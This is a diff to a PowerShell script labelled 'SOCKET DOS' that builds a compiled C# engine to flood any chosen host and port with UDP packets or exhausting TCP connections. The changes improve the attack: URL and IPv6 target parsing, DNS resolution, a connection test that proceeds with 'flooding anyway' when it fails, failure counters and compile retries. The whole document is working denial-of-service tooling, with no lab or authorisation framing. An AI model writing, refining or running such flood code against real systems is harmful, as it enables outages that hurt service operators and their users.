@@ -12,20 +12,63 @@ while ($protocol -ne "TCP" -and $protocol -ne "UDP") {
     if ($answer -match '^(U|UDP)$') { $protocol = "UDP" }
 }
 
-$host_address = Read-Host -Prompt "Target host"
+# accept a bare host, host:port, or a full URL; scheme sets the default port
+$target_answer = Read-Host -Prompt "Target host or URL (example.com, https://example.com, 10.0.0.1:8080)"
+$port_hint = 0
+if ($target_answer -match '^(?<scheme>https?)://') {
+    if ($Matches['scheme'] -eq 'https') { $port_hint = 443 } else { $port_hint = 80 }
+    $target_answer = $target_answer -replace '^[a-zA-Z]+://', ''
+    $target_answer = ($target_answer -split '/')[0]
+}
+if ($target_answer -match '^\[(?<ipv6>[^\]]+)\](:(?<port>\d+))?$') {
+    $host_address = $Matches['ipv6']
+    if ($Matches['port']) { $port_hint = [int]$Matches['port'] }
+} elseif ($target_answer -match '^(?<host>[^:]+):(?<port>\d+)$') {
+    $host_address = $Matches['host']
+    $port_hint = [int]$Matches['port']
+} else {
+    $host_address = $target_answer
+}
+if ([string]::IsNullOrWhiteSpace($host_address)) {
+    $host_address = Read-Host -Prompt "Target host"
+}
 
 $port_number = 0
 while ($port_number -lt 1 -or $port_number -gt 65535) {
-    $answer = Read-Host -Prompt "Target port (1-65535)"
+    $prompt_text = if ($port_hint) { "Target port (Enter = $port_hint)" } else { "Target port (1-65535)" }
+    $answer = Read-Host -Prompt $prompt_text
+    if ($answer -eq "" -and $port_hint) { $port_number = $port_hint }
     if ($answer -match '^\d+$') { $port_number = [int]$answer }
 }
 
 Write-Host "-------------------------------- SOCKET DOS $protocol --------------------------------" -ForegroundColor Yellow
 
+try {
+    $target_addresses = [System.Net.Dns]::GetHostAddresses($host_address)
+} catch {
+    Write-Host "Cannot resolve '$host_address' - nothing will reach the target. Check the host name or URL." -ForegroundColor Red
+    return
+}
+$target_ip_address = $target_addresses | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
+if (-not $target_ip_address) { $target_ip_address = $target_addresses | Select-Object -First 1 }
+Write-Host "Resolved $host_address -> $target_ip_address" -ForegroundColor Cyan
+
+if ($protocol -eq "TCP") {
+    $test_client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $test_client.Connect($target_ip_address, $port_number)
+        Write-Host "Test connection succeeded" -ForegroundColor Green
+        $test_client.Close()
+    } catch {
+        Write-Host "Test connection failed: $($_.Exception.Message) - flooding anyway" -ForegroundColor DarkYellow
+    }
+}
+
 # compiled flood engine so the send loop is not throttled by the PowerShell interpreter
 $flood_source = @"
 using System;
 using System.Collections.Concurrent;
+using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 
@@ -34,9 +77,11 @@ public static class SocketFlood
     public static volatile bool StopRequested;
     public static long UdpPacketsSent;
     public static long TcpConnectionsHeld;
+    public static long TcpConnectFailures;
+    public static string TcpLastErrorMessage;
     private static readonly ConcurrentBag<TcpClient> HeldClients = new ConcurrentBag<TcpClient>();
 
-    public static void FloodUdp(string targetHost, int port, int packetSizeBytes, int workerCount)
+    public static void FloodUdp(IPAddress target, int port, int packetSizeBytes, int workerCount)
     {
         var payload = new byte[packetSizeBytes];
         for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
@@ -45,7 +90,7 @@ public static class SocketFlood
             {
                 using (var sender = new UdpClient())
                 {
-                    sender.Connect(targetHost, port);
+                    sender.Connect(target, port);
                     while (!StopRequested)
                     {
                         sender.Send(payload, payload.Length);
@@ -58,7 +103,7 @@ public static class SocketFlood
         }
     }
 
-    public static void FloodTcp(string targetHost, int port, int workerCount)
+    public static void FloodTcp(IPAddress target, int port, int workerCount)
     {
         for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
         {
@@ -69,12 +114,14 @@ public static class SocketFlood
                     var client = new TcpClient();
                     try
                     {
-                        client.Connect(targetHost, port);
+                        client.Connect(target, port);
                         HeldClients.Add(client);
                         Interlocked.Increment(ref TcpConnectionsHeld);
                     }
-                    catch (Exception)
+                    catch (Exception error)
                     {
+                        Interlocked.Increment(ref TcpConnectFailures);
+                        TcpLastErrorMessage = error.Message;
                         client.Close();
                         Thread.Sleep(20);
                     }
@@ -95,15 +142,29 @@ public static class SocketFlood
     }
 }
 "@
-Add-Type -TypeDefinition $flood_source -Language CSharp
+try {
+    Add-Type -TypeDefinition $flood_source -Language CSharp
+} catch {
+    Write-Host "Compiler failed once ($($_.Exception.Message)); retrying..." -ForegroundColor DarkYellow
+    Start-Sleep -Seconds 1
+    try {
+        Add-Type -TypeDefinition $flood_source -Language CSharp
+    } catch {
+        Write-Host "Compiler failed twice - the machine may be too low on memory to compile the flood engine" -ForegroundColor Red
+        return
+    }
+}
 
 if ($protocol -eq "TCP") {
     Write-Host "Flooding $host_address`:$port_number with TCP connections from $worker_count parallel workers (Ctrl+C to stop and release)..." -ForegroundColor Yellow
-    [SocketFlood]::FloodTcp($host_address, $port_number, $worker_count)
+    [SocketFlood]::FloodTcp($target_ip_address, $port_number, $worker_count)
     try {
         while ($true) {
             Start-Sleep -Seconds 1
             Write-Host ("Held open: {0:N0} connections" -f [SocketFlood]::TcpConnectionsHeld)
+            if ([SocketFlood]::TcpConnectFailures -gt 0) {
+                Write-Host ("Connect failures: {0:N0} - last error: {1}" -f [SocketFlood]::TcpConnectFailures, [SocketFlood]::TcpLastErrorMessage) -ForegroundColor DarkYellow
+            }
         }
     } finally {
         [SocketFlood]::StopRequested = $true
@@ -113,7 +174,7 @@ if ($protocol -eq "TCP") {
     }
 } else {
     Write-Host "Flooding $host_address`:$port_number with UDP packets from $worker_count parallel workers (Ctrl+C to stop)..." -ForegroundColor Yellow
-    [SocketFlood]::FloodUdp($host_address, $port_number, $udp_packet_size_bytes, $worker_count)
+    [SocketFlood]::FloodUdp($target_ip_address, $port_number, $udp_packet_size_bytes, $worker_count)
     try {
         while ($true) {
             Start-Sleep -Seconds 1
